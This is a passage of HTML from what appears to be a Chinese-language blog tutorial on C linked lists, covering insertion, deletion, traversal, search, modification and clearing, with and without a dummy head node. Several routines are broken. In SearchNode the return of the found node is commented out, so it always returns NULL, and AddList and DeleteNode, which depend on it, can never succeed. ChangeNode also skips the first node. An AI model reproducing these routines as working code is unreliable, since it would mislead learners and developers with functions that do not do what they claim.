punctuation">;</span>    <span class="token comment" spellcheck="true">//节点数据进行赋值</span>    pTemp<span class="token operator">-></span>a <span class="token operator">=</span> n<span class="token punctuation">;</span>    pTemp<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//接在链表上</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//链表为空，新节点既是头也是尾巴</span>    <span class="token punctuation">{</span>        head <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>        tail <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        pTemp<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新节点的下一个指向头</span>        head <span class="token operator">=</span> pTemp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//新节点就是头了</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="尾添加"><a href="#尾添加" class="headerlink" title="尾添加"></a>尾添加</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">AddTail</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//创建链表，在链表中增加一个数据，尾添加</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//创建一个节点</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//节点数据进行赋值</span>    pTemp<span class="token operator">-></span>a <span class="token operator">=</span> n<span class="token punctuation">;</span>    pTemp<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//链接</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> tail <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//空链表，既是头，又是尾</span>    <span class="token punctuation">{</span>        head <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//不为空，往尾巴上添加</span>    <span class="token punctuation">{</span>        tail<span class="token operator">-></span>next <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    tail <span class="token operator">=</span> pTemp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 尾巴一直指向最后一个节点</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="任意位置添加"><a href="#任意位置添加" class="headerlink" title="任意位置添加"></a>任意位置添加</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">AddList</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//在数字index后面添加数字n</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表为空，没有节点\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">SearchNode</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"没有指定的节点\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//有此节点，给a创建节点</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pTemp<span class="token operator">-></span>a <span class="token operator">=</span> n<span class="token punctuation">;</span>    pTemp<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> tail<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//链接到链表上</span>    <span class="token punctuation">{</span>        tail<span class="token operator">-></span>next <span class="token operator">=</span> pTemp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//尾巴的下一个，指向新的节点</span>        tail <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//新节点是最后一个，变成尾巴</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        pTemp<span class="token operator">-></span>next <span class="token operator">=</span> fp<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先连</span>        fp<span class="token operator">-></span>next <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//后断</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><h5 id="头删除"><a href="#头删除" class="headerlink" title="头删除"></a>头删除</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">DeleteHead</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//头删除</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//检查链表是否为空</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表为NULL，无需释放!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> tail<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        tail <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> head<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//记住旧的头</span>        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//头的下一个节点变成新的头</span>        <span class="token function">free</span><span class="token punctuation">(</span>pTemp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//释放旧的头</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="尾删除"><a href="#尾删除" class="headerlink" title="尾删除"></a>尾删除</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">DeleteTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//尾删除</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//检查链表是否为空</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表为NULL，无需释放!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//链表不为空 有一个节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> tail<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        tail <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//找尾巴前一个节点</span>        <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>pTemp<span class="token operator">-></span>next <span class="token operator">!=</span> tail<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pTemp <span class="token operator">=</span> pTemp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//找到尾巴 删除并释放</span>        <span class="token function">free</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//释放尾巴</span>        tail <span class="token operator">=</span> pTemp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//移动尾巴</span>        tail<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//尾巴的下一个指针赋值为NULL</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="任意位置删除"><a href="#任意位置删除" class="headerlink" title="任意位置删除"></a>任意位置删除</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">DeleteNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//删除指定节点 </span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//检查链表是否为空</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表为NULL，无需释放!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//链表有东西，找此节点</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token function">SearchNode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"查无此节点\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//找到了</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> head<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//只有一个节点</span>    <span class="token punctuation">{</span>        <span class="token function">DeleteHead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> tail<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//有两个节点</span>    <span class="token punctuation">{</span>        <span class="token function">DeleteTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token comment" spellcheck="true">//有多个节点</span>    <span class="token punctuation">{</span>        <span class="token keyword">struct</span> Node<span class="token operator">*</span> fp <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>next <span class="token operator">!=</span> pTemp<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            fp <span class="token operator">=</span> fp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//找到了</span>        fp<span class="token operator">-></span>next <span class="token operator">=</span> pTemp<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//连接</span>        <span class="token function">free</span><span class="token punctuation">(</span>pTemp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//释放</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">SeekList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//遍历链表——>查</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>pTemp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d  "</span><span class="token punctuation">,</span>pTemp<span class="token operator">-></span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        pTemp <span class="token operator">=</span> pTemp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> Node<span class="token operator">*</span> <span class="token function">SearchNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//查询指定节点</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>pTemp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> pTemp<span class="token operator">-></span>a<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第%d个数为%d\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> pTemp<span class="token operator">-></span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//return pTemp;</span>        <span class="token punctuation">}</span>        pTemp <span class="token operator">=</span> pTemp<span class="token operator">-></span>next<span class="token punctuation">;</span>        num<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//没找到</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">ChangeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//将index改为 n  </span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> fp <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>a <span class="token operator">==</span> index<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            fp<span class="token operator">-></span>a <span class="token operator">=</span> n<span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        fp <span class="token operator">=</span> fp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="清空"><a href="#清空" class="headerlink" title="清空"></a>清空</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FreeList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//链表清空</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> head<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//记录头，防止头被修改，丢内存</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>pTemp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">struct</span> Node<span class="token operator">*</span> fp <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>        pTemp <span class="token operator">=</span> pTemp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//头尾清空</span>    head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    tail <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="空头链表"><a href="#空头链表" class="headerlink" title="空头链表"></a>空头链表</h3><p>空头链表和无空头链表其实本质区别不大，空头链表就是头结点为空（有头指针，但是没有数值域）在进行某些操</p><p>作的时候就比较简单；</p><p>空头链表和无空头链表相似度很高，部分操作相同，就不一一列举了；</p><h4 id="头文件-函数声明-结构体-全局变量-1"><a href="#头文件-函数声明-结构体-全局变量-1" class="headerlink" title="头文件+函数声明+结构体+全局变量"></a>头文件+函数声明+结构体+全局变量</h4><h5 id="头文件（根据使用的语言自行修改）-1"><a href="#头文件（根据使用的语言自行修改）-1" class="headerlink" title="头文件（根据使用的语言自行修改）"></a>头文件（根据使用的语言自行修改）</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="函数声明-1"><a href="#函数声明-1" class="headerlink" title="函数声明"></a>函数声明</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> Node<span class="token operator">*</span> <span class="token function">CreateNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建节点</span><span class="token keyword">void</span> <span class="token function">NewList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//空头链表初始化</span><span class="token keyword">void</span> <span class="token function">AddHead</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 头添加</span><span class="token keyword">void</span> <span class="token function">AddTail</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//尾添加</span><span class="token keyword">void</span> <span class="token function">AddRand</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//在数字index后面添加数字a</span><span class="token keyword">void</span> <span class="token function">DeleteHead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除头</span><span class="token keyword">void</span> <span class="token function">DeleteTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除尾</span><span class="token keyword">void</span> <span class="token function">DeleteNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除指定节点</span><span class="token keyword">void</span> <span class="token function">SeekList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//遍历</span><span class="token keyword">struct</span> Node<span class="token operator">*</span> <span class="token function">SearchNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查找指定节点，并返回节点地址</span><span class="token keyword">void</span> <span class="token function">FreeList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//释放链表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">//节点结构体</span><span class="token keyword">struct</span> Node<span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//指向下一个节点的指针</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="全局变量-1"><a href="#全局变量-1" class="headerlink" title="全局变量"></a>全局变量</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">//链表头尾指针（全局变量）</span><span class="token keyword">struct</span> Node<span class="token operator">*</span> head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">struct</span> Node<span class="token operator">*</span> tail <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="空头链表初始化"><a href="#空头链表初始化" class="headerlink" title="空头链表初始化"></a>空头链表初始化</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">NewList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//空头链表初始化</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//链表空头</span>    head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    tail <span class="token operator">=</span> head<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="创建节点"><a href="#创建节点" class="headerlink" title="创建节点"></a>创建节点</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> Node<span class="token operator">*</span> <span class="token function">CreateNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//创建节点</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建一个节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//创建失败</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    pTemp<span class="token operator">-></span>a <span class="token operator">=</span> n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//节点成员赋值</span>    pTemp<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pTemp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回节点</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="添加-1"><a href="#添加-1" class="headerlink" title="添加"></a>添加</h4><h5 id="头添加-1"><a href="#头添加-1" class="headerlink" title="头添加"></a>头添加</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">AddHead</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 头添加</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token function">CreateNode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建一个节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//创建失败</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"内存不足\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 一般不会申请失败，除非内存不足</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//连接</span>    pTemp<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>    head<span class="token operator">-></span>next <span class="token operator">=</span> pTemp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 